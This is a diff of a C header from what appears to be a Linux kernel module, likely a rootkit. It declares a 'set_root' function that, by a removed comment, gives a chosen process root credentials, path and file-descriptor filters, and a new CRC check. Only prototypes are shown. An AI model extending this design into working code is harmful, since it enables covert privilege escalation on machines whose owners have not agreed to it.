+++ src/include/utils.h
@@ -16,18 +16,15 @@
 #include <linux/user_namespace.h>
 #include <linux/sched/task.h>
 
-/* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
+#include "crc32.h"
+
 static inline bool is_bad_fd(const int fd) {
     return fd < 3;
 }
 
-/* Checks if path matches target */
 bool is_bad_path(const char *full_path, const char *target, size_t n);
 
-/* Set given credentials to root (does not commit creds for you!) */
-static void __set_root_creds(struct cred *creds);
-
-/* Wrapper for __set_root_creds */
 void set_root(pid_t pid);
 
+bool is_valid_crc(char *buf, const uint32_t crc, size_t size);
 #endif // UTILS_H
